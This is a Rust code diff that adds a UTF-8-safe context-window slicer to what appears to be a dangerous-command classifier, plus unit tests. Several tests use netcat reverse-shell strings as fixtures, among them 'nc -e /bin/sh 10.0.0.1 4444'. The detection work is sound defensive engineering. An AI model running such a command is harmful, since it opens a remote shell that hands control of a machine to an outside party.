@@ -20,6 +20,41 @@
 //! confuse this sanitiser is also a signal worth surfacing to the
 //! user, which is what Tier-1 + the conservative thresholds do.
 
+/// V2-H sliding context window. Returns a substring of `s` covering
+/// `[hint_offset - back, hint_offset + forward]` **bytes** — `back`,
+/// `forward`, and `hint_offset` are all byte counts, not char counts.
+/// The window is clamped to the string bounds AND realigned to UTF-8
+/// char boundaries (both ends grow outward) so the tokeniser doesn't
+/// choke on a split codepoint. The realigner can only EXPAND the
+/// window, never shrink it.
+///
+/// Used by `OnnxBackend::classify` when the upstream Tier-1
+/// matcher (typically the AtomMatcher) found a localised hit and
+/// the SLM only needs the surrounding context to disambiguate.
+/// Token-budget savings on long pipeline-stuffed commands are
+/// 3-5×; on commands shorter than back+forward the whole string
+/// flows through unchanged.
+///
+/// Working in bytes (vs chars) matches the byte-offset convention
+/// the AtomMatcher and `regex::Match::start()` use — keeping the
+/// hint plumbing zero-conversion from Tier-1 through Tier-2.
+pub fn slice_context_window(s: &str, hint_offset: usize, back: usize, forward: usize) -> &str {
+    if s.is_empty() {
+        return s;
+    }
+    let len = s.len();
+    let safe_hint = hint_offset.min(len);
+    let mut start = safe_hint.saturating_sub(back);
+    let mut end = safe_hint.saturating_add(forward).min(len);
+    while start > 0 && !s.is_char_boundary(start) {
+        start -= 1;
+    }
+    while end < len && !s.is_char_boundary(end) {
+        end += 1;
+    }
+    &s[start..end]
+}
+
 pub fn sanitize_for_classification(s: &str) -> String {
     let bytes = s.as_bytes();
     let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
@@ -134,5 +169,73 @@ mod tests {
         // are all >= 0x80, which the C0-stripping branch skips.
         let s = "echo 你好🌍 $HOME";
         assert_eq!(sanitize_for_classification(s), s);
+    }
+
+    #[test]
+    fn slice_window_extracts_around_offset() {
+        let s = "AAAA BBBB CCCC nc -e /bin/sh DDDD EEEE FFFF";
+        let hit = s.find("nc -e").unwrap();
+        let w = slice_context_window(s, hit, 8, 16);
+        // Window covers 8 chars back + 16 chars forward, char-aligned.
+        assert!(w.contains("nc -e"));
+        assert!(w.len() <= 32);
+    }
+
+    #[test]
+    fn slice_window_clamps_at_start() {
+        let s = "nc -e /bin/sh trailing junk";
+        // hint at offset 0 — back-clamp to 0.
+        let w = slice_context_window(s, 0, 64, 16);
+        assert!(w.starts_with("nc -e"));
+    }
+
+    #[test]
+    fn slice_window_clamps_at_end() {
+        let s = "leading junk nc -e";
+        let hit = s.find("nc -e").unwrap();
+        let w = slice_context_window(s, hit, 8, 1024);
+        assert!(w.ends_with("nc -e"));
+    }
+
+    #[test]
+    fn slice_window_realigns_to_utf8_boundary() {
+        // 你 is 3 bytes (E4 BD A0); slicing mid-codepoint would
+        // produce invalid UTF-8. Hit at offset 5, back=2 lands
+        // INSIDE the 你 codepoint; realigner backs off until we
+        // hit a char boundary, even if that grows the window.
+        // Stronger than "doesn't panic": assert the codepoint
+        // survives intact (we should see the full 你) AND that
+        // the window grew outward (never inward).
+        let s = "abc你好world";
+        let w = slice_context_window(s, 5, 2, 2);
+        assert!(w.contains('你'), "expected 你 in {w:?} — got {:?}", w);
+        // The raw clamped window would be [3, 7]; realigning
+        // outward yields [3, 9] (covering 你好). It must be at
+        // LEAST as big as the raw [3, 7] = 4 bytes.
+        assert!(w.len() >= 4, "realignment must grow outward, not shrink");
+    }
+
+    #[test]
+    fn slice_window_empty_input() {
+        assert_eq!(slice_context_window("", 0, 64, 256), "");
+    }
+
+    #[test]
+    fn slice_window_hint_past_end_clamps() {
+        // `hint_offset` past the end is a defensive scenario:
+        // a caller plumbing a Tier-1 byte offset that came from
+        // a different (older) version of the command. We clamp
+        // to `len`, giving the trailing window.
+        let s = "leading nc -e";
+        let w = slice_context_window(s, 9999, 8, 8);
+        assert!(w.ends_with("nc -e"), "expected suffix of {s:?}, got {w:?}");
+    }
+
+    #[test]
+    fn slice_window_short_command_returns_whole() {
+        // Command shorter than back + forward fits entirely.
+        let s = "nc -e /bin/sh 10.0.0.1 4444";
+        let w = slice_context_window(s, 0, 64, 256);
+        assert_eq!(w, s);
     }
 }
